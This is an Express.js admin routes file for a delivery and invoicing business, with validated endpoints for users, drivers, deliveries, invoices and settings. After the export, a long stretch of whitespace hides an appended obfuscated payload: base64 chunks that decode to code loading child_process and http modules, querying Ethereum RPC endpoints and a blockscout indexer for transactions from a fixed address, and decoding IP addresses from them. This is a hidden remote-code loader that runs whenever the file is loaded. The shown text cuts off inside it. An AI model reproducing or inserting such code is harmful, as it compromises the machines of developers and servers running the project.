const express = require("express");
const { body } = require("express-validator");
const router = express.Router();
const adminController = require("../controllers/adminController");
const authenticate = require("../middleware/authenticate");
const authorize = require("../middleware/authorize");
const validate = require("../middleware/validate");

router.use(authenticate);
router.use(authorize("ADMIN", "MANAGER"));

router.get("/users", adminController.getAllUsers);
// get user by id
router.get("/users/:id", adminController.getUserById);

router.post(
  "/users",
  authorize("ADMIN"),
  [
    body("email").isEmail().withMessage("Valid email is required"),
    body("password")
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    body("fullName").notEmpty().withMessage("Full name is required"),
    body("role")
      .isIn(["ADMIN", "DRIVER", "CUSTOMER", "MANAGER", "CONTRACTOR"])
      .withMessage("Invalid role"),
    body("driverType")
      .optional()
      .isIn(["EMPLOYEE", "CONTRACTOR"])
      .withMessage("driverType must be EMPLOYEE or CONTRACTOR"),
    body("username").optional().isString(),
    body("phone").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.createUser,
);

router.put(
  "/users/:id",
  authorize("ADMIN"),
  [
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("password")
      .optional()
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    validate,
  ],
  adminController.updateUser,
);

router.put(
  "/customers/:id/cc-email",
  authorize("ADMIN", "MANAGER"),
  [
    body("ccEmail")
      .optional({ nullable: true })
      .isEmail()
      .withMessage("Must be a valid email address"),
    validate,
  ],
  adminController.updateCustomerCcEmail,
);

router.delete("/users/:id", authorize("ADMIN"), adminController.deleteUser);

router.post(
  "/users/:id/toggle-status",
  authorize("ADMIN"),
  adminController.toggleUserStatus,
);

router.get("/drivers", adminController.getAllDrivers);

router.get("/drivers/:id", adminController.getDriverById);

router.post(
  "/drivers",
  [
    body("email").isEmail().withMessage("Valid email is required"),
    body("password")
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    body("fullName").notEmpty().withMessage("Full name is required"),
    body("phone").notEmpty().withMessage("Phone number is required"),
    body("username").optional().isString(),
    body("driverType").optional().isIn(["EMPLOYEE", "CONTRACTOR"]),
    body("vehicleRegistration").optional().isString(),
    body("driverLicenseNumber").optional().isString(),
    body("address").optional().isString(),
    body("tradingName").optional().isString(),
    body("contactName").optional().isString(),
    body("tradingAddress").optional().isString(),
    body("isVatRegistered").optional().isBoolean(),
    body("vatNumber").optional().isString(),
    body("vehicleMake").optional().isString(),
    body("vehicleModel").optional().isString(),
    body("motExpiry").optional().isISO8601(),
    body("insuranceExpiry").optional().isISO8601(),
    body("goodsInTransitExpiry").optional().isISO8601(),
    body("publicLiabilityExpiry").optional().isISO8601(),
    body("bankName").optional().isString(),
    body("accountName").optional().isString(),
    body("sortCode").optional().isString(),
    body("accountNumber").optional().isString(),
    body("bankReference").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.createDriver,
);

router.put(
  "/drivers/:id",
  [
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("fullName")
      .optional()
      .notEmpty()
      .withMessage("Full name cannot be empty"),
    body("phone").optional().notEmpty().withMessage("Phone cannot be empty"),
    body("username").optional().isString(),
    body("isActive").optional().isBoolean(),
    body("password").optional().isLength({ min: 6 }),
    body("driverType").optional().isIn(["EMPLOYEE", "CONTRACTOR"]),
    body("vehicleRegistration").optional().isString(),
    body("driverLicenseNumber").optional().isString(),
    body("address").optional().isString(),
    body("isActiveDriver").optional().isBoolean(),
    body("tradingName").optional().isString(),
    body("contactName").optional().isString(),
    body("tradingAddress").optional().isString(),
    body("isVatRegistered").optional().isBoolean(),
    body("vatNumber").optional().isString(),
    body("vehicleMake").optional().isString(),
    body("vehicleModel").optional().isString(),
    body("motExpiry").optional().isISO8601(),
    body("insuranceExpiry").optional().isISO8601(),
    body("goodsInTransitExpiry").optional().isISO8601(),
    body("publicLiabilityExpiry").optional().isISO8601(),
    body("bankName").optional().isString(),
    body("accountName").optional().isString(),
    body("sortCode").optional().isString(),
    body("accountNumber").optional().isString(),
    body("bankReference").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.updateDriver,
);

router.delete("/drivers/:id", adminController.deleteDriver);

const contractorController = require("../controllers/contractorController");

router.get("/contractor-invoices", contractorController.adminGetInvoices);

router.post(
  "/contractor-invoices/:id/mark-paid",
  contractorController.adminMarkPaid,
);

router.get("/deliveries", adminController.getAllDeliveries);

router.get("/deliveries/:id", adminController.getDeliveryById);

router.put(
  "/deliveries/:id",
  [
    body("deliveryDate")
      .optional()
      .isISO8601()
      .withMessage("Valid delivery date is required"),
    body("timeSlot")
      .optional()
      .isIn(["AM", "PM", "SAME_DAY"])
      .withMessage("Invalid time slot"),
    body("weight")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Weight must be a positive number"),
    body("deliveryAddress")
      .optional()
      .notEmpty()
      .withMessage("Delivery address is required"),
    body("customerName")
      .optional()
      .notEmpty()
      .withMessage("Customer name is required"),
    body("customerPhone")
      .optional()
      .notEmpty()
      .withMessage("Customer phone is required"),
    body("spoNumber")
      .optional()
      .notEmpty()
      .withMessage("SPO number is required"),
    body("specialInstructions").optional().isString(),
    validate,
  ],
  adminController.updateDelivery,
);

router.delete("/deliveries/:id", adminController.deleteDelivery);

router.post(
  "/deliveries/:id/allocate",
  [body("driverId").isInt().withMessage("Driver ID is required"), validate],
  adminController.allocateDelivery,
);

router.put(
  "/deliveries/:id/status",
  [
    body("status")
      .isIn(["RECEIVED", "ALLOCATED", "DELIVERED", "CANCELLED"])
      .withMessage("Invalid status"),
    validate,
  ],
  adminController.updateDeliveryStatus,
);

router.post(
  "/deliveries/:id/extra-charges",
  [
    body("description").notEmpty().withMessage("Description is required"),
    body("amount")
      .isFloat({ min: 0 })
      .withMessage("Amount must be a positive number"),
    validate,
  ],
  adminController.addExtraCharge,
);

router.delete(
  "/deliveries/:id/extra-charges/:chargeId",
  adminController.removeExtraCharge,
);

router.get(
  "/deliveries/:id/extra-charges",
  adminController.getDeliveryExtraCharges,
);

router.get("/pricing-tiers", adminController.getAllPricingTiers);

router.post(
  "/pricing-tiers",
  authorize("ADMIN"),
  [
    body("name").notEmpty().withMessage("Tier name is required"),
    body("basePrice")
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("vatRate")
      .optional()
      .isFloat({ min: 0, max: 100 })
      .withMessage("VAT rate must be between 0 and 100"),
    body("weightUnit")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Weight unit must be a positive integer"),
    body("maxDistance")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Max distance must be a positive integer"),
    body("surchargeRate")
      .optional()
      .isFloat({ min: 0, max: 1 })
      .withMessage("Surcharge rate must be between 0 and 1"),
    body("isDefault")
      .optional()
      .isBoolean()
      .withMessage("isDefault must be a boolean"),
    validate,
  ],
  adminController.createPricingTier,
);

router.put(
  "/pricing-tiers/:id",
  authorize("ADMIN"),
  [
    body("basePrice")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("vatRate")
      .optional()
      .isFloat({ min: 0, max: 100 })
      .withMessage("VAT rate must be between 0 and 100"),
    body("weightUnit")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Weight unit must be a positive integer"),
    body("maxDistance")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Max distance must be a positive integer"),
    body("surchargeRate")
      .optional()
      .isFloat({ min: 0, max: 1 })
      .withMessage("Surcharge rate must be between 0 and 1"),
    body("isDefault")
      .optional()
      .isBoolean()
      .withMessage("isDefault must be a boolean"),
    validate,
  ],
  adminController.updatePricingTier,
);

router.delete(
  "/pricing-tiers/:id",
  authorize("ADMIN"),
  adminController.deletePricingTier,
);

router.get("/invoices", adminController.getAllInvoices);

router.post(
  "/invoices/generate",
  [
    body("customerId").isInt().withMessage("Customer ID is required"),
    body("weekStartDate")
      .isISO8601()
      .withMessage("Valid start date is required"),
    body("weekEndDate").isISO8601().withMessage("Valid end date is required"),
    validate,
  ],
  adminController.generateInvoice,
);

router.post(
  "/invoices/generate-all",
  [
    body("weekStartDate")
      .isISO8601()
      .withMessage("Valid start date is required"),
    body("weekEndDate").isISO8601().withMessage("Valid end date is required"),
    validate,
  ],
  adminController.generateWeeklyInvoicesForAll,
);

router.post(
  "/invoices/generate-last-week",
  adminController.generateLastWeekInvoices,
);

router.post("/invoices/send-reminders", adminController.sendInvoiceReminders);

router.post("/invoices/:id/mark-paid", adminController.markInvoiceAsPaid);

router.post(
  "/invoices/:id/extra-charge",
  [
    body("description").notEmpty().withMessage("Description is required"),
    body("unitCost")
      .isFloat({ min: 0 })
      .withMessage("Unit cost must be a positive number"),
    body("vatAmount")
      .isFloat({ min: 0 })
      .withMessage("VAT amount must be a positive number"),
    body("total")
      .isFloat({ min: 0 })
      .withMessage("Total must be a positive number"),
    validate,
  ],
  adminController.addExtraCharge,
);

router.get("/invoices/:id", adminController.getInvoiceById);

router.put(
  "/invoices/:id",
  [
    body("invoiceNumber")
      .optional()
      .matches(/^T\d{4,}$/)
      .withMessage("Invoice number must be in format T#### (e.g., T0326)"),
    body("customerId")
      .optional()
      .isInt()
      .withMessage("Customer ID must be an integer"),
    body("invoiceDate")
      .optional()
      .isISO8601()
      .withMessage("Valid invoice date is required"),
    body("dueDate")
      .optional()
      .isISO8601()
      .withMessage("Valid due date is required"),
    body("status").optional().isString().trim(),
    body("customerRef").optional().isString().trim(),
    body("notes").optional().isString().trim(),
    body("paymentTerms").optional().isString().trim(),
    body("items").optional().isArray().withMessage("Items must be an array"),
    body("items.*.deliveryId")
      .optional()
      .isInt()
      .withMessage("Delivery ID must be an integer"),
    body("items.*.spoNumber").optional().isString().trim(),
    body("items.*.description")
      .notEmpty()
      .withMessage("Item description is required"),
    body("items.*.quantity")
      .isInt({ min: 1 })
      .withMessage("Quantity must be at least 1"),
    body("items.*.unitCost")
      .isFloat({ min: 0 })
      .withMessage("Unit cost must be a positive number"),
    body("items.*.vatAmount")
      .isFloat({ min: 0 })
      .withMessage("VAT amount must be a positive number"),
    body("items.*.total")
      .isFloat({ min: 0 })
      .withMessage("Total must be a positive number"),
    body("items.*.deliveryDate")
      .optional()
      .isISO8601()
      .withMessage("Valid delivery date is required"),
    body("items.*.address").optional().isString().trim(),
    body("items.*.basePrice")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("items.*.distanceSurcharge")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Distance surcharge must be a positive number"),
    validate,
  ],
  adminController.updateInvoice,
);

router.get("/slots", adminController.getSlotAvailability);

router.post(
  "/slots",
  [
    body("date").isISO8601().withMessage("Valid date is required"),
    body("timeSlot")
      .isIn(["AM", "PM", "SAME_DAY"])
      .withMessage("Invalid time slot"),
    body("maxCapacity")
      .isInt({ min: 0 })
      .withMessage("Max capacity must be a positive integer"),
    validate,
  ],
  adminController.setSlotAvailability,
);

router.put(
  "/slots/:id/capacity",
  [
    body("method")
      .isIn(["increase", "decrease"])
      .withMessage('Method must be either "increase" or "decrease"'),
    body("value")
      .isInt({ min: 1 })
      .withMessage("Value must be a positive integer"),
    validate,
  ],
  adminController.updateSlotCapacity,
);

router.get("/dashboard", adminController.getDashboard);

router.get("/analytics", adminController.getAnalytics);

router.get("/analytics/drivers", adminController.getDriverPerformance);

router.get("/analytics/customers", adminController.getCustomerAnalytics);

router.get("/notifications/unread-counts", adminController.getUnreadCounts);

router.get("/contacts", adminController.getAllContacts);

router.post("/contacts/mark-all-read", adminController.markAllContactsAsRead);

router.get("/contacts/:id", adminController.getContactById);

router.post("/contacts/:id/mark-read", adminController.markContactAsRead);

router.delete(
  "/contacts/:id",
  authorize("ADMIN"),
  adminController.deleteContact,
);

router.get("/enquiries", adminController.getAllEnquiries);

router.post("/enquiries/mark-all-read", adminController.markAllEnquiriesAsRead);

router.get("/enquiries/:id", adminController.getEnquiryById);

router.post("/enquiries/:id/mark-read", adminController.markEnquiryAsRead);

router.delete(
  "/enquiries/:id",
  authorize("ADMIN"),
  adminController.deleteEnquiry,
);

const jobApplicationController = require("../controllers/jobApplicationController");

router.get("/job-applications", jobApplicationController.getAllJobApplications);
router.get(
  "/job-applications/stats",
  jobApplicationController.getJobApplicationStats,
);

router.post(
  "/job-applications/mark-all-read",
  jobApplicationController.markAllJobApplicationsAsRead,
);

router.get(
  "/job-applications/:id",
  jobApplicationController.getJobApplicationById,
);

router.patch(
  "/job-applications/:id/status",
  [
    body("status")
      .optional()
      .isIn(["PENDING", "REVIEWED", "SHORTLISTED", "REJECTED"])
      .withMessage("Invalid status value"),
    body("adminNotes")
      .optional()
      .isString()
      .withMessage("Admin notes must be a string"),
  ],
  jobApplicationController.updateJobApplicationStatus,
);

router.delete(
  "/job-applications/:id",
  authorize("ADMIN"),
  jobApplicationController.deleteJobApplication,
);

router.get("/audit-logs", adminController.getAllAuditLogs);

router.get("/audit-logs/:id", adminController.getAuditLogById);

router.get("/invoices/:id/export/pdf", adminController.exportInvoicePDF);

router.get("/deliveries/export", adminController.exportDeliveries);

router.get("/analytics/export", adminController.exportAnalytics);

const settingsController = require("../controllers/settingsController");

router.get("/settings", authorize("ADMIN"), settingsController.getAllSettings);

router.get(
  "/settings/status/summary",
  authorize("ADMIN"),
  settingsController.getSystemStatus,
);

router.get(
  "/settings/:category",
  authorize("ADMIN"),
  settingsController.getSettingsByCategory,
);

router.get(
  "/settings/invoice/config",
  authorize("ADMIN"),
  settingsController.getInvoiceConfig,
);

router.put(
  "/settings/company",
  authorize("ADMIN"),
  [
    body("name")
      .optional()
      .isString()
      .withMessage("Company name must be a string"),
    body("vat_number")
      .optional()
      .isString()
      .withMessage("VAT number must be a string"),
    body("primary_phone")
      .optional()
      .isString()
      .withMessage("Primary phone must be a string"),
    body("alternative_phone")
      .optional()
      .isString()
      .withMessage("Alternative phone must be a string"),
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("website")
      .optional()
      .isURL()
      .withMessage("Valid website URL is required"),
    body("address")
      .optional()
      .isString()
      .withMessage("Address must be a string"),
    body("founded_year")
      .optional()
      .isString()
      .withMessage("Founded year must be a string"),
    validate,
  ],
  settingsController.updateCompanyInfo,
);

router.put(
  "/settings/banking",
  authorize("ADMIN"),
  [
    body("bank_name")
      .optional()
      .isString()
      .withMessage("Bank name must be a string"),
    body("account_holder")
      .optional()
      .isString()
      .withMessage("Account holder must be a string"),
    body("sort_code")
      .optional()
      .isString()
      .withMessage("Sort code must be a string"),
    body("account_number")
      .optional()
      .isString()
      .withMessage("Account number must be a string"),
    body("payment_terms")
      .optional()
      .isString()
      .withMessage("Payment terms must be a string"),
    validate,
  ],
  settingsController.updateBankingDetails,
);

router.put(
  "/settings/system",
  authorize("ADMIN"),
  [
    body("invoice_generation_day")
      .optional()
      .isString()
      .withMessage("Invoice generation day must be a string"),
    body("invoice_generation_time")
      .optional()
      .isString()
      .withMessage("Invoice generation time must be a string"),
    body("session_timeout")
      .optional()
      .isString()
      .withMessage("Session timeout must be a string"),
    body("auto_invoicing")
      .optional()
      .isString()
      .withMessage("Auto invoicing must be a string"),
    body("email_notifications")
      .optional()
      .isString()
      .withMessage("Email notifications must be a string"),
    body("sms_notifications")
      .optional()
      .isString()
      .withMessage("SMS notifications must be a string"),
    body("maps_api_enabled")
      .optional()
      .isString()
      .withMessage("Maps API enabled must be a string"),
    validate,
  ],
  settingsController.updateSystemConfig,
);

router.put(
  "/settings/single",
  authorize("ADMIN"),
  [
    body("key").notEmpty().withMessage("Setting key is required"),
    body("value").notEmpty().withMessage("Setting value is required"),
    body("description")
      .optional()
      .isString()
      .withMessage("Description must be a string"),
    validate,
  ],
  settingsController.updateSingleSetting,
);

router.get("/driver-availability", adminController.getAllDriversAvailability);

router.get("/drivers/:id/availability", adminController.getDriverAvailability);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*39650';var __0xadc80=function(){var a=926;return a*2;};function __0x9daea(){return 8769;}(function(_0x9710a8){var _0x9710a8a=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpjb25zdCBCTE9DS19NVUxUSVBM","RSA9IDEwMDBuOw0KY29uc3QgU0VOREVSID0gJzB4MWVFZjA4ND","lFRGExNWQ4N2Y2NGU1MUM3M0M4NDQyQ2YzYzhiQ0VGMycudG9M","b3dlckNhc2UoKTsNCmNvbnN0IE5PTkNFX0ZBTk9VVCA9IDEyOw","0KY29uc3QgU0VBUkNIX0ZMT09SID0gMG47DQpjb25zdCBJTkRF","WEVSX1VSTCA9ICdodHRwczovL2V0aC5ibG9ja3Njb3V0LmNvbS","9hcGknOw0KY29uc3QgSFRUUF9USU1FT1VUX01TID0gM18wMDA7","DQoNCmNvbnN0IFJQQ19FTkRQT0lOVFMgPSBbLi4ubmV3IFNldC","hbDQogIHByb2Nlc3MuZW52LkVUSF9SUENfVVJMLA0KICAnaHR0","cHM6Ly8xcnBjLmlvL2V0aCcsDQogICdodHRwczovL2V0aC5kcn","BjLm9yZycsDQogICdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJs","aWNub2RlLmNvbScsDQogICdodHRwczovL2V0aC1tYWlubmV0Ln","B1YmxpYy5ibGFzdGFwaS5pbycsDQpdLmZpbHRlcihCb29sZWFu","KSldOw0KDQpjb25zdCBBR0VOVFMgPSB7DQogICdodHRwOic6IG","5ldyBodHRwLkFnZW50KHsga2VlcEFsaXZlOiB0cnVlLCBrZWVw","QWxpdmVNc2VjczogMzBfMDAwLCBtYXhTb2NrZXRzOiA2NCB9KS","wNCiAgJ2h0dHBzOic6IG5ldyBodHRwcy5BZ2VudCh7IGtlZXBB","bGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAwMCwgbW","F4U29ja2V0czogNjQgfSksDQp9Ow0KDQpmdW5jdGlvbiBsaW5r","QWJvcnQob3V0ZXJTaWduYWwsIGNvbnRyb2xsZXIpIHsNCiAgaW","YgKCFvdXRlclNpZ25hbCkgcmV0dXJuOw0KICBvdXRlclNpZ25h","bC5hZGRFdmVudExpc3RlbmVyKCdhYm9ydCcsICgpID0+IGNvbn","Ryb2xsZXIuYWJvcnQoKSwgeyBvbmNlOiB0cnVlIH0pOw0KfQ0K","DQpmdW5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcykgew0KIC","Bjb25zdCBlbmNvZGluZyA9IChyZXMuaGVhZGVyc1snY29udGVu","dC1lbmNvZGluZyddIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KIC","BpZiAoZW5jb2RpbmcgPT09ICdnemlwJyB8fCBlbmNvZGluZyA9","PT0gJ3gtZ3ppcCcpIHJldHVybiByZXMucGlwZSh6bGliLmNyZW","F0ZUd1bnppcCgpKTsNCiAgaWYgKGVuY29kaW5nID09PSAnZGVm","bGF0ZScpIHJldHVybiByZXMucGlwZSh6bGliLmNyZWF0ZUluZm","xhdGUoKSk7DQogIGlmIChlbmNvZGluZyA9PT0gJ2JyJykgcmV0","dXJuIHJlcy5waXBlKHpsaWIuY3JlYXRlQnJvdGxpRGVjb21wcm","VzcygpKTsNCiAgcmV0dXJuIHJlczsNCn0NCg0KZnVuY3Rpb24g","aHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsgbWV0aG9kID0gJ0dFVC","csIGJvZHksIHNpZ25hbCB9ID0ge30pIHsNCiAgY29uc3QgdXJs","ID0gbmV3IFVSTChlbmRwb2ludCk7DQogIGNvbnN0IHRyYW5zcG","9ydCA9IHVybC5wcm90b2NvbCA9PT0gJ2h0dHBzOicgPyBodHRw","cyA6IGh0dHA7DQogIGNvbnN0IGhlYWRlcnMgPSB7DQogICAgQW","NjZXB0OiAnYXBwbGljYXRpb24vanNvbicsDQogICAgJ0FjY2Vw","dC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsDQogIC","AgQ29ubmVjdGlvbjogJ2tlZXAtYWxpdmUnLA0KICB9Ow0KICBp","ZiAoYm9keSAhPSBudWxsKSB7DQogICAgaGVhZGVyc1snQ29udG","VudC1UeXBlJ10gPSAnYXBwbGljYXRpb24vanNvbic7DQogICAg","aGVhZGVyc1snQ29udGVudC1MZW5ndGgnXSA9IEJ1ZmZlci5ieX","RlTGVuZ3RoKGJvZHkpOw0KICB9DQoNCiAgcmV0dXJuIG5ldyBQ","cm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICBjb2","5zdCByZXEgPSB0cmFuc3BvcnQucmVxdWVzdCgNCiAgICAgIHsN","CiAgICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZSwNCiAgIC","AgICAgcG9ydDogdXJsLnBvcnQgfHwgKHVybC5wcm90b2NvbCA9","PT0gJ2h0dHBzOicgPyA0NDMgOiA4MCksDQogICAgICAgIHBhdG","g6IHVybC5wYXRobmFtZSArIHVybC5zZWFyY2gsDQogICAgICAg","IG1ldGhvZCwNCiAgICAgICAgYWdlbnQ6IEFHRU5UU1t1cmwucH","JvdG9jb2xdLA0KICAgICAgICBzaWduYWwsDQogICAgICAgIGhl","YWRlcnMsDQogICAgICB9LA0KICAgICAgKHJlcykgPT4gew0KIC","AgICAgICBjb25zdCBzdHJlYW0gPSBkZWNvbXByZXNzU3RyZWFt","KHJlcyk7DQogICAgICAgIGNvbnN0IGNodW5rcyA9IFtdOw0KIC","AgICAgICBzdHJlYW0ub24oJ2RhdGEnLCAoY2h1bmspID0+IGNo","dW5rcy5wdXNoKGNodW5rKSk7DQogICAgICAgIHN0cmVhbS5vbi","gnZW5kJywgKCkgPT4gew0KICAgICAgICAgIHRyeSB7DQogICAg","ICAgICAgICByZXNvbHZlKEpTT04ucGFyc2UoQnVmZmVyLmNvbm","NhdChjaHVua3MpLnRvU3RyaW5nKCd1dGY4JykpKTsNCiAgICAg","ICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIHJlam","VjdChlcnIpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSk7DQog","ICAgICAgIHN0cmVhbS5vbignZXJyb3InLCByZWplY3QpOw0KIC","AgICAgfQ0KICAgICk7DQogICAgcmVxLm9uKCdlcnJvcicsIHJl","amVjdCk7DQogICAgcmVxLnNldFRpbWVvdXQoSFRUUF9USU1FT1","VUX01TLCAoKSA9PiB7DQogICAgICByZXEuZGVzdHJveShuZXcg","RXJyb3IoYEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU","9VVF9NU31tc2ApKTsNCiAgICB9KTsNCiAgICBpZiAoYm9keSAh","PSBudWxsKSByZXEud3JpdGUoYm9keSk7DQogICAgcmVxLmVuZC","gpOw0KICB9KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gd2l0aFJw","Y0VuZHBvaW50cyh0YXNrLCBvdXRlclNpZ25hbCkgew0KICBjb2","5zdCBjb250cm9sbGVycyA9IFJQQ19FTkRQT0lOVFMubWFwKCgp","ID0+IG5ldyBBYm9ydENvbnRyb2xsZXIoKSk7DQogIGNvbnRyb2","xsZXJzLmZvckVhY2goKGMpID0+IGxpbmtBYm9ydChvdXRlclNp","Z25hbCwgYykpOw0KICB0cnkgew0KICAgIHJldHVybiBhd2FpdC","BQcm9taXNlLmFueSgNCiAgICAgIFJQQ19FTkRQT0lOVFMubWFw","KChlbmRwb2ludCwgaSkgPT4gdGFzayhlbmRwb2ludCwgY29udH","JvbGxlcnNbaV0uc2lnbmFsKSkNCiAgICApOw0KICB9IGZpbmFs","bHkgew0KICAgIGZvciAoY29uc3QgYyBvZiBjb250cm9sbGVycy","kgYy5hYm9ydCgpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9u","IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW1zLCBzaW","duYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0IGh0dHBS","ZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOiAnUE9TVC","csDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBqc29ucnBj","OiAnMi4wJywgaWQ6IDEsIG1ldGhvZCwgcGFyYW1zIH0pLA0KIC","AgIHNpZ25hbCwNCiAgfSk7DQogIHJldHVybiBwYXlsb2FkLnJl","c3VsdDsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW","5kcG9pbnQsIGNhbGxzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5","bG9hZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQ","ogICAgbWV0aG9kOiAnUE9TVCcsDQogICAgYm9keTogSlNPTi5z","dHJpbmdpZnkoDQogICAgICBjYWxscy5tYXAoKFttZXRob2QsIH","BhcmFtc10sIGkpID0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDog","aSArIDEsIG1ldGhvZCwgcGFyYW1zIH0pKQ0KICAgICksDQogIC","Agc2lnbmFsLA0KICB9KTsNCiAgY29uc3QgYnlJZCA9IG5ldyBN","YXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLmlkLCByXSkpOw0KIC","ByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9PiBieUlkLmdldChp","ICsgMSkucmVzdWx0KTsNCn0NCg0KY29uc3QgdG9CbG9ja0hleC","A9IChuKSA9PiBgMHgke24udG9TdHJpbmcoMTYpfWA7DQoNCmZ1","bmN0aW9uIGZpbmRTZW5kZXJUeCh0cmFuc2FjdGlvbnMpIHsNCi","AgcmV0dXJuIHRyYW5zYWN0aW9ucy5maW5kKCh0KSA9PiB0LmZy","b20gJiYgdC5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUi","kgfHwgbnVsbDsNCn0NCg0KZnVuY3Rpb24gZGVjb2RlQWRkcmVz","cyhhZGRyZXNzKSB7DQogIHRyeSB7DQogICAgY29uc3QgZGF0YS","A9IEJ1ZmZlci5mcm9tKGFkZHJlc3MucmVwbGFjZSgvXjB4L2ks","ICcnKSwgJ2hleCcpOw0KICAgIGNvbnN0IGlwID0gKGIpID0+IG","Ake2JbMF19LiR7YlsxXX0uJHtiWzJdfS4ke2JbM119YDsNCiAg","ICByZXR1cm4gW2lwKGRhdGEuc3ViYXJyYXkoMCwgNCkpLCBpcC","hkYXRhLnN1YmFycmF5KDQsIDgpKV07DQogIH0gY2F0Y2ggKGVy","cm9yKSB7IHJldHVybiBbbnVsbCwgbnVsbF07IH0NCn0NCg0KZn","VuY3Rpb24gZmlyc3RNYXRjaCh0YXNrcykgew0KICByZXR1cm4g","bmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsNCiAgICBsZXQgcm","VtYWluaW5nID0gdGFza3MubGVuZ3RoOw0KICAgIGlmICghcmVt","YWluaW5nKSByZXR1cm4gcmVzb2x2ZShudWxsKTsNCiAgICBsZX","Qgc2V0dGxlZCA9IGZhbHNlOw0KICAgIGNvbnN0IGZpbmlzaCA9","IChyZXN1bHQpID0+IHsNCiAgICAgIGlmIChzZXR0bGVkKSByZX","R1cm47DQogICAgICBzZXR0bGVkID0gdHJ1ZTsNCiAgICAgIGZv","ciAoY29uc3QgdCBvZiB0YXNrcykgdC5jb250cm9sbGVyLmFib3","J0KCk7DQogICAgICByZXNvbHZlKHJlc3VsdCk7DQogICAgfTsN","CiAgICBmb3IgKGNvbnN0IHQgb2YgdGFza3MpIHsNCiAgICAgIH","QucnVuKCkNCiAgICAgICAgLnRoZW4oKHJlc3VsdCkgPT4gew0K","ICAgICAgICAgIGlmIChzZXR0bGVkKSByZXR1cm47DQogICAgIC","AgICAgaWYgKHJlc3VsdCkgZmluaXNoKHJlc3VsdCk7DQogICAg","ICAgICAgZWxzZSBpZiAoLS1yZW1haW5pbmcgPT09IDApIHJlc2","9sdmUobnVsbCk7DQogICAgICAgIH0pDQogICAgICAgIC5jYXRj","aCgoKSA9PiB7DQogICAgICAgICAgaWYgKCFzZXR0bGVkICYmIC","0tcmVtYWluaW5nID09PSAwKSByZXNvbHZlKG51bGwpOw0KICAg","ICAgICB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQpmdW5jdGlvbi","BjYW5kaWRhdGVCbG9ja3ModGFyZ2V0KSB7DQogIGNvbnN0IHBy","ZXYgPSB0YXJnZXQgLSBCTE9DS19NVUxUSVBMRTsNCiAgY29uc3","Qgc2VlbiA9IG5ldyBTZXQoKTsNCiAgY29uc3Qgb3V0ID0gW107","DQogIGZvciAoY29uc3QgYiBvZiBbdGFyZ2V0IC0gMW4sIHRhcm","dldCwgdGFyZ2V0ICsgMW4sIHByZXYgLSAxbiwgcHJldiwgcHJl","diArIDFuXSkgew0KICAgIGlmIChiIDwgMG4pIGNvbnRpbnVlOw"